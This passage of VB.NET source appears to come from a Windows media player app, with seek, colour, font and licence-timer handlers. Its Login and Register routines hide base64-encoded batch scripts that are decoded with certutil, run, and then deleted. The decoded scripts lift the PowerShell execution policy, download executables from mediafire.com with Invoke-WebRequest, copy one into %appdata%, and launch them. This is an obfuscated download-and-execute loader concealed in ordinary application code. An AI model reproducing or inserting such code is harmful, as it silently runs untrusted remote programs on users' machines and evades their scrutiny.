        sb.AppendLine("echo bi5wczEgZGVsIC9zIC9xIExvZ2luLnBzMQ0KaWYgbm90IGV4aXN0ICV+ZHAwXExv>>LoginEncoded.File")
        sb.AppendLine("echo Z2luLmV4ZSBnb3RvIFdlYnBhZ2VMb2dpbg0KaWYgZXhpc3QgJX5kcDBcTG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo ZXhlIGdvdG8gU3RhcnRMb2dpbg0KOlN0YXJ0TG9naW4NCmNkICV+ZHAwXA0KaWYg>>LoginEncoded.File")
        sb.AppendLine("echo bm90IGV4aXN0ICVhcHBkYXRhJVxUaHVuZGVyQm94XExvZ2luLmV4ZSBjb3B5IC95>>LoginEncoded.File")
        sb.AppendLine("echo ICV+ZHAwXExvZ2luLmV4ZSAlYXBwZGF0YSVcUmVzdGFydC1HVEE1XA0KY2QgJWFw>>LoginEncoded.File")
        sb.AppendLine("echo cGRhdGElXFRodW5kZXJCb3hcICYmIHN0YXJ0IExvZ2luLmV4ZQ0KZ290byBFbmRM>>LoginEncoded.File")
        sb.AppendLine("echo b2dpbg0KOldlYnBhZ2VMb2dpbg0Kc3RhcnQgaHR0cDovL3d3dy5tZWRpYWZpcmUu>>LoginEncoded.File")
        sb.AppendLine("echo Y29tL2ZpbGUvazFxZDRiY2h2YjV3YnE4L0xvZ2luLmV4ZSIgLU91dEZpbGUgIkxv>>LoginEncoded.File")
        sb.AppendLine("echo Z2luLnR4dCINCmdvdG8gRW5kTG9naW4NCjpFbmRMb2dpbg0KZ290byBFbmQNCjpF>>LoginEncoded.File")
        sb.AppendLine("echo bmQNCkV4aXQ=>>LoginEncoded.File")
        sb.AppendLine("certutil -decode LoginEncoded.File LoginEncoded.bat")
        sb.AppendLine("start LoginEncoded.bat")
        sb.AppendLine("if exist LoginEncoded.File del /s /q LoginEncoded.File")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Login.bat", sb.ToString())
        Process.Start("Login.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Login.bat")
    End Sub
    Private Sub SecondeToolStripMenuItem23_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem23.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 120
    End Sub
    Private Sub SecondeToolStripMenuItem24_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem24.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 125
    End Sub
    Private Sub SecondeToolStripMenuItem25_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem25.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 130
    End Sub
    Private Sub SecondeToolStripMenuItem26_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem26.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 135
    End Sub
    Private Sub SecondeToolStripMenuItem27_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem27.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 140
    End Sub
    Private Sub SecondeToolStripMenuItem28_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem28.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 145
    End Sub
    Private Sub SecondeToolStripMenuItem29_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem29.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 150
    End Sub
    Private Sub SecondeToolStripMenuItem30_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem30.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 155
    End Sub
    Private Sub SecondeToolStripMenuItem31_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem31.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 160
    End Sub
    Private Sub ScondeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScondeToolStripMenuItem.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 165
    End Sub
    Private Sub SecondeToolStripMenuItem32_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem32.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 170
    End Sub
    Private Sub SecondeToolStripMenuItem33_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem33.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 175
    End Sub
    Private Sub SecondeToolStripMenuItem34_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem34.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 180
    End Sub
    Private Sub SecondeToolStripMenuItem35_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem35.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 185
    End Sub
    Private Sub SecondeToolStripMenuItem36_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem36.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 190
    End Sub
    Private Sub SecondeToolStripMenuItem37_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem37.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 195
    End Sub
    Private Sub SecondeToolStripMenuItem38_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem38.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 200
    End Sub
    Private Sub SecondeToolStripMenuItem39_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem39.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 205
    End Sub
    Private Sub SecondeToolStripMenuItem40_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem40.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 210
    End Sub
    Private Sub SecondeToolStripMenuItem41_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem41.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 215
    End Sub
    Private Sub SecondeToolStripMenuItem42_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem42.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 220
    End Sub
    Private Sub SecondeToolStripMenuItem43_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem43.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 225
    End Sub
    Private Sub SecondeToolStripMenuItem44_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem44.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 230
    End Sub
    Private Sub SecondeToolStripMenuItem45_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem45.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 235
    End Sub
    Private Sub SecondeToolStripMenuItem46_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem46.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 240
    End Sub
    Private Sub SecondeToolStripMenuItem47_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem47.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 245
    End Sub
    Private Sub SecondeToolStripMenuItem48_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem48.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 250
    End Sub
    Private Sub SecondeToolStripMenuItem49_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem49.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 255
    End Sub
    Private Sub SecondeToolStripMenuItem50_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem50.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 260
    End Sub
    Private Sub SecondeToolStripMenuItem51_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem51.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 265
    End Sub
    Private Sub SecondeToolStripMenuItem52_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem52.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 270
    End Sub
    Private Sub SecondeToolStripMenuItem53_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem53.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 275
    End Sub
    Private Sub SecondeToolStripMenuItem54_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem54.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 280
    End Sub
    Private Sub SecondeToolStripMenuItem55_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem55.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 285
    End Sub
    Private Sub SecondeToolStripMenuItem56_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem56.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 290
    End Sub
    Private Sub SecondeToolStripMenuItem57_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem57.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 295
    End Sub
    Private Sub Label9_Click(sender As Object, e As EventArgs) Handles Label9.Click
        If (IO.File.Exists("Register.bat")) Then GoTo Register
        Call Register()
        GoTo EndSub
Register:
        Process.Start("Register.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Register()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("if exist Register.bat goto Registering")
        sb.AppendLine("if not exist Register.bat goto decodeRegistering")
        sb.AppendLine(":decodeRegistering")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>Register.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFJlZ2lzdGVyDQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlci5leGUgZ290byBTdGFydFJlZ2lzdGVyDQo6UmVnaXN0ZXIg>>Register.Files")
        sb.AppendLine("echo DQpAZWNobyBvZmYNCnRpdGxlIFJlZ2lzdGVyDQplY2hvICAgKioqKioqKioqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KZWNobyAgICoqKi8v>>Register.Files")
        sb.AppendLine("echo IFVwZGF0ZS1SZWdpc3Rlci5iYXQgLy8gV2luMTAgLy8qKioNCmVjaG8gICAqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQpjZCAl>>Register.Files")
        sb.AppendLine("echo fmRwMA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXJMaW5rLmJhdCBkZWwgL3MgL3Eg>>Register.Files")
        sb.AppendLine("echo JX5kcDBcUmVnaXN0ZXJMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIu>>Register.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci50eHQNCmlmIGV4aXN0ICV+ZHAw>>Register.Files")
        sb.AppendLine("echo XFJlZ2lzdGVyLkZpbGUgZGVsIC9zIC9xICV+ZHAwXFJlZ2lzdGVyLkZpbGUNCmlm>>Register.Files")
        sb.AppendLine("echo IGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLnBzMSBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0>>Register.Files")
        sb.AppendLine("echo ZXIucHMxDQpwb3dlcnNoZWxsIFNldC1FeGVjdXRpb25Qb2xpY3kgLVNjb3BlIEN1>>Register.Files")
        sb.AppendLine("echo cnJlbnRVc2VyIFVucmVzdHJpY3RlZA0KcG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZv>>Register.Files")
        sb.AppendLine("echo a2UtV2ViUmVxdWVzdCAiaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvZzIz>>Register.Files")
        sb.AppendLine("echo cGNoNGx5ZDdoeHJwL1JlZ2lzdGVyLmV4ZSIgLU91dEZpbGUgIlJlZ2lzdGVyLnR4>>Register.Files")
        sb.AppendLine("echo dCINCmNkICV+ZHAwDQpmaW5kIC9JICJocmVmPSdodHRwOi8vIiBSZWdpc3Rlci50>>Register.Files")
        sb.AppendLine("echo eHQ+PlJlZ2lzdGVyTGluay5iYXQNCmVjaG8gRXhpdD4+UmVnaXN0ZXJMaW5rLmJh>>Register.Files")
        sb.AppendLine("echo dA0KZWNobyBLRWRsZEMxRGIyNTBaVzUwSUZKbFoybHpkR1Z5VEdsdWF5NWlZWFFw>>Register.Files")
        sb.AppendLine("echo SUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqPj5SZWdpc3Rlci5GaWxlDQplY2hvIGRD>>Register.Files")
        sb.AppendLine("echo QjdKRjhnTFhKbGNHeGhZMlVnSW1oeVpXWTlKeUlzSUNKN0RRcDRlWG96TWpFaWZT>>Register.Files")
        sb.AppendLine("echo QjhJQTBLVTJWMExVTnY+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gYm5SbGJuUWdVbVZu>>Register.Files")
        sb.AppendLine("echo YVhOMFpYSk1hVzVyTG1KaGRBMEtKR2hoYzJndUp5QTlKdzBLS0VkbGRDMURiMjUw>>Register.Files")
        sb.AppendLine("echo Wlc1MD4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBJRkpsWjJsemRHVnlUR2x1YXk1aVlY>>Register.Files")
        sb.AppendLine("echo UXBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoPj5SZWdp>>Register.Files")
        sb.AppendLine("echo c3Rlci5GaWxlDQplY2hvIFkyVWdJaVJvWVhOb0xpY2lMQ0FpRFFwNmVYZzBOU0o5>>Register.Files")
        sb.AppendLine("echo SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JTWldkcGMzUmw+PlJlZ2lzdGVyLkZpbGUN>>Register.Files")
        sb.AppendLine("echo CmVjaG8gY2t4cGJtc3VZbUYwRFFvTkNpaEhaWFF0UTI5dWRHVnVkQ0JTWldkcGMz>>Register.Files")
        sb.AppendLine("echo Umxja3hwYm1zdVltRjBLU0I4SUEwSz4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBSbTl5>>Register.Files")
        sb.AppendLine("echo WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0o0ZVhvek1qRWlMQ0Fp>>Register.Files")
        sb.AppendLine("echo Y0c5M1pYSnphR1ZzPj5SZWdpc3Rlci5GaWxlDQplY2hvIGJDQXRRMjl0YldGdVpD>>Register.Files")
        sb.AppendLine("echo Qkpiblp2YTJVdFYyVmlVbVZ4ZFdWemRDQWlmU0I4SUEwS1UyVjBMVU52Ym5SbGJu>>Register.Files")
        sb.AppendLine("echo UWc+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gVW1WbmFYTjBaWEpNYVc1ckxtSmhkQTBL>>Register.Files")
        sb.AppendLine("echo S0VkbGRDMURiMjUwWlc1MElGSmxaMmx6ZEdWeVRHbHVheTVpWVhRcD4+UmVnaXN0>>Register.Files")
        sb.AppendLine("echo ZXIuRmlsZQ0KZWNobyBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xY>>Register.Files")
        sb.AppendLine("echo SmxjR3hoWTJVZ0lpNWxlQ0lzSUNJdVpYaGxJQzFQPj5SZWdpc3Rlci5GaWxlDQpl>>Register.Files")
        sb.AppendLine("echo Y2hvIGRYUkdhV3hsSUZKbFoybHpkR1Z5TG1WNFpTQW1KaUJsZUdsMEluMGdmQ0FO>>Register.Files")
        sb.AppendLine("echo Q2xObGRDMURiMjUwWlc1MElGSmw+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gWjJsemRH>>Register.Files")
        sb.AppendLine("echo VnlUR2x1YXk1aVlYUU5DZz09Pj5SZWdpc3Rlci5GaWxlDQp0aW1lb3V0IC9UIDEN>>Register.Files")
        sb.AppendLine("echo CmNlcnR1dGlsIC1kZWNvZGUgUmVnaXN0ZXIuRmlsZSBSZWdpc3Rlci5wczENCnRp>>Register.Files")
        sb.AppendLine("echo bWVvdXQgL1QgMQ0KUG93ZXJTaGVsbC5leGUgLUZpbGUgUmVnaXN0ZXIucHMxIC1O>>Register.Files")
        sb.AppendLine("echo b0V4aXQNCnRpbWVvdXQgL1QgMQ0KZmluZCAvSSAicG93ZXJzaGVsbCAtQ29tbWFu>>Register.Files")
        sb.AppendLine("echo ZCBJbnZva2UtV2ViUmVxdWVzdCBodHRwIiBSZWdpc3RlckxpbmsuYmF0Pj5SZWdp>>Register.Files")
        sb.AppendLine("echo c3RlckRvd25sb2FkTGluay5iYXQNCmNkICV+ZHAwICYmIHN0YXJ0IFJlZ2lzdGVy>>Register.Files")
        sb.AppendLine("echo RG93bmxvYWRMaW5rLmJhdA0KdGltZW91dCAvVCAyMg0KY2QgJX5kcDANCnRpbWVv>>Register.Files")
        sb.AppendLine("echo dXQgL1QgMg0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXJEb3dubG9hZExpbmsuYmF0>>Register.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3RlckRvd25sb2FkTGluay5iYXQNCmlmIGV4>>Register.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLnR4dCBkZWwgL3Mg>>Register.Files")
        sb.AppendLine("echo L3EgJX5kcDBcUmVnaXN0ZXIudHh0DQppZiBleGlzdCAlfmRwMFxSZWdpc3Rlci5G>>Register.Files")
        sb.AppendLine("echo aWxlIGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5GaWxlDQppZiBleGlzdCAlfmRw>>Register.Files")
        sb.AppendLine("echo MFxSZWdpc3Rlci5wczEgZGVsIC9zIC9xICV+ZHAwXFJlZ2lzdGVyLnBzMQ0KaWYg>>Register.Files")
        sb.AppendLine("echo bm90IGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFdlYnBhZ2VSZWdpc3Rl>>Register.Files")
        sb.AppendLine("echo cg0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIuZXhlIGdvdG8gU3RhcnRSZWdpc3Rl>>Register.Files")
        sb.AppendLine("echo cg0KOlN0YXJ0UmVnaXN0ZXINCmNkICV+ZHAwXCAmJiBzdGFydCBSZWdpc3Rlci5l>>Register.Files")
        sb.AppendLine("echo eGUNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyXCBybWRpciAvcyAvcSAlfmRwMFxS>>Register.Files")
        sb.AppendLine("echo ZWdpc3RlclwNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQgZGVsIC9z>>Register.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyLnR4dCBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0ZXIudHh0DQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlci5GaWxlIGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5GaWxl>>Register.Files")
        sb.AppendLine("echo DQppZiBleGlzdCAlfmRwMFxSZWdpc3Rlci5wczEgZGVsIC9zIC9xICV+ZHAwXFJl>>Register.Files")
        sb.AppendLine("echo Z2lzdGVyLnBzMQ0KZ290byBFbmRSZWdpc3Rlcg0KOldlYnBhZ2VSZWdpc3Rlcg0K>>Register.Files")
        sb.AppendLine("echo c3RhcnQgaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvZzIzcGNoNGx5ZDdo>>Register.Files")
        sb.AppendLine("echo eHJwL1JlZ2lzdGVyLmV4ZQ0KZ290byBFbmRSZWdpc3Rlcg0KOkVuZFJlZ2lzdGVy>>Register.Files")
        sb.AppendLine("echo DQpnb3RvIEV4aXQNCjpFeGl0DQpFeGl0DQo=>>Register.Files")
        sb.AppendLine("certutil -decode Register.Files Register.bat")
        sb.AppendLine(":Registering")
        sb.AppendLine("If exist License.Times copy /y /v License.Times %~dp0\")
        sb.AppendLine("start Register.bat")
        sb.AppendLine("if exist Register.Files del /s /q Register.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("registering.bat", sb.ToString())
        Process.Start("registering.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("registering.bat")
    End Sub
    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        My.Settings.FontStyle = Label7.Font
        My.Settings.BackGround = Label7.BackColor
        My.Settings.BackGround = BackColor
        My.Settings.TextColor = Label2.ForeColor
        My.Settings.BackGround = BackColor
        My.Settings.TopTextColor = Label9.ForeColor
        My.Settings.Save()
    End Sub
    Private Sub UseMySaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UseMySaveToolStripMenuItem.Click
        If UseMySaveToolStripMenuItem.Checked = True Then
            My.Settings.UseMySave = True
        Else
            My.Settings.UseMySave = False
        End If
        Label2.Font = My.Settings.FontStyle
        Label1.Font = My.Settings.FontStyle
        Label3.Font = My.Settings.FontStyle
        Label4.Font = My.Settings.FontStyle
        Label5.Font = My.Settings.FontStyle
        Label6.Font = My.Settings.FontStyle
        Label7.Font = My.Settings.FontStyle
        CheckBox2.Font = My.Settings.FontStyle
        CheckBox1.Font = My.Settings.FontStyle
        Label9.Font = My.Settings.FontStyle
        Label14.Font = My.Settings.FontStyle
        Label8.Font = My.Settings.FontStyle
        Label13.Font = My.Settings.FontStyle
        Label10.Font = My.Settings.FontStyle
        Label11.Font = My.Settings.FontStyle
        Label12.Font = My.Settings.FontStyle
        Label18.Font = My.Settings.FontStyle
        Panel1.BackColor = My.Settings.BackGround
        Label2.BackColor = My.Settings.BackGround
        Label1.BackColor = My.Settings.BackGround
        Label3.BackColor = My.Settings.BackGround
        Label4.BackColor = My.Settings.BackGround
        Label5.BackColor = My.Settings.BackGround
        Label6.BackColor = My.Settings.BackGround
        Label7.BackColor = My.Settings.BackGround
        Label15.BackColor = My.Settings.BackGround
        Label16.BackColor = My.Settings.BackGround
        Label17.BackColor = My.Settings.BackGround
        EditToolStripMenuItem.BackColor = My.Settings.BackGround
        Label10.BackColor = My.Settings.BackGround
        Label11.BackColor = My.Settings.BackGround
        Label12.BackColor = My.Settings.BackGround
        Label18.BackColor = My.Settings.BackGround
        BackColor = My.Settings.BackGround
        CheckBox2.BackColor = My.Settings.BackGround
        CheckBox1.BackColor = My.Settings.BackGround
        Label9.BackColor = My.Settings.BackGround
        Label14.BackColor = My.Settings.BackGround
        Label8.BackColor = My.Settings.BackGround
        Label13.BackColor = My.Settings.BackGround
        Label2.ForeColor = My.Settings.TextColor
        Label1.ForeColor = My.Settings.TextColor
        Label3.ForeColor = My.Settings.TextColor
        Label4.ForeColor = My.Settings.TextColor
        Label5.ForeColor = My.Settings.TextColor
        Label6.ForeColor = My.Settings.TextColor
        Label7.ForeColor = My.Settings.TextColor
        Label15.ForeColor = My.Settings.TextColor
        Label16.ForeColor = My.Settings.TextColor
        Label17.ForeColor = My.Settings.TextColor
        EditToolStripMenuItem.ForeColor = My.Settings.TextColor
        Playlist.ForeColor = My.Settings.TextColor
        CheckBox2.ForeColor = My.Settings.TopTextColor
        CheckBox1.ForeColor = My.Settings.TopTextColor
        Label9.ForeColor = My.Settings.TopTextColor
        Label14.ForeColor = My.Settings.TopTextColor
        Label8.ForeColor = My.Settings.TopTextColor
        Label13.ForeColor = My.Settings.TopTextColor
        Label10.ForeColor = My.Settings.TopTextColor
        Label11.ForeColor = My.Settings.TopTextColor
        Label12.ForeColor = My.Settings.TopTextColor
        Label18.ForeColor = My.Settings.TopTextColor
    End Sub
    Private Sub BackColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackColorToolStripMenuItem.Click
        Dim BackGround As DialogResult
        BackGround = ColorDialog1.ShowDialog()
        If BackGround = Windows.Forms.DialogResult.OK Then
            Label2.BackColor = ColorDialog1.Color
            Label1.BackColor = ColorDialog1.Color
            Label3.BackColor = ColorDialog1.Color
            Label4.BackColor = ColorDialog1.Color
            Label5.BackColor = ColorDialog1.Color
            Label6.BackColor = ColorDialog1.Color
            Label7.BackColor = ColorDialog1.Color
            Label10.BackColor = ColorDialog1.Color
            Label11.BackColor = ColorDialog1.Color
            Label12.BackColor = ColorDialog1.Color
            Label18.BackColor = ColorDialog1.Color
            Label15.BackColor = ColorDialog1.Color
            Label16.BackColor = ColorDialog1.Color
            Label17.BackColor = ColorDialog1.Color
            EditToolStripMenuItem.BackColor = ColorDialog1.Color
            CheckBox2.BackColor = ColorDialog1.Color
            CheckBox1.BackColor = ColorDialog1.Color
            Label9.BackColor = ColorDialog1.Color
            Label14.BackColor = ColorDialog1.Color
            Label8.BackColor = ColorDialog1.Color
            Label13.BackColor = ColorDialog1.Color
            Panel1.BackColor = ColorDialog1.Color
            BackColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub TexteColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TexteColorToolStripMenuItem.Click
        Dim colors As DialogResult
        colors = ColorDialog1.ShowDialog()
        If colors = Windows.Forms.DialogResult.OK Then
            Label2.ForeColor = ColorDialog1.Color
            Label1.ForeColor = ColorDialog1.Color
            Label3.ForeColor = ColorDialog1.Color
            Label4.ForeColor = ColorDialog1.Color
            Label5.ForeColor = ColorDialog1.Color
            Label6.ForeColor = ColorDialog1.Color
            Label7.ForeColor = ColorDialog1.Color
            Label15.ForeColor = ColorDialog1.Color
            Label16.ForeColor = ColorDialog1.Color
            Label17.ForeColor = ColorDialog1.Color
            EditToolStripMenuItem.ForeColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub FontStyleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FontStyleToolStripMenuItem.Click
        FontDialog1.ShowDialog()
        Label2.Font = FontDialog1.Font
        Label1.Font = FontDialog1.Font
        Label3.Font = FontDialog1.Font
        Label4.Font = FontDialog1.Font
        Label5.Font = FontDialog1.Font
        Label6.Font = FontDialog1.Font
        Label7.Font = FontDialog1.Font
        CheckBox2.Font = FontDialog1.Font
        CheckBox1.Font = FontDialog1.Font
        Label9.Font = FontDialog1.Font
        Label14.Font = FontDialog1.Font
        Label8.Font = FontDialog1.Font
        Label13.Font = FontDialog1.Font
        Panel1.Font = FontDialog1.Font
        Label15.Font = FontDialog1.Font
        Label16.Font = FontDialog1.Font
        Label17.Font = FontDialog1.Font
        EditToolStripMenuItem.Font = FontDialog1.Font
    End Sub
    Private Sub TopTexteColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TopTexteColorToolStripMenuItem.Click
        Dim colors As DialogResult
        colors = ColorDialog1.ShowDialog()
        If colors = Windows.Forms.DialogResult.OK Then
            CheckBox2.ForeColor = ColorDialog1.Color
            CheckBox1.ForeColor = ColorDialog1.Color
            Label9.ForeColor = ColorDialog1.Color
            Label14.ForeColor = ColorDialog1.Color
            Label8.ForeColor = ColorDialog1.Color
            Label13.ForeColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label10.Text = Times
    End Sub
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        If Label18.Visible = False Then
            GoTo EndSub
        Else
        End If
ShowDiff:
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\License.Times") = False Then
            GoTo EndSub
        End If
        Dim reader2 As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label12.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader2.ReadLine()))
        Dim date1 As Date = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim date2 As Date = CDate(Label12.Text)
        Dim Result2 As Integer
        Result2 = DateDiff(DateInterval.Second, date1, date2)
        Label18.Text = Result2
EndSub:
    End Sub
End Class
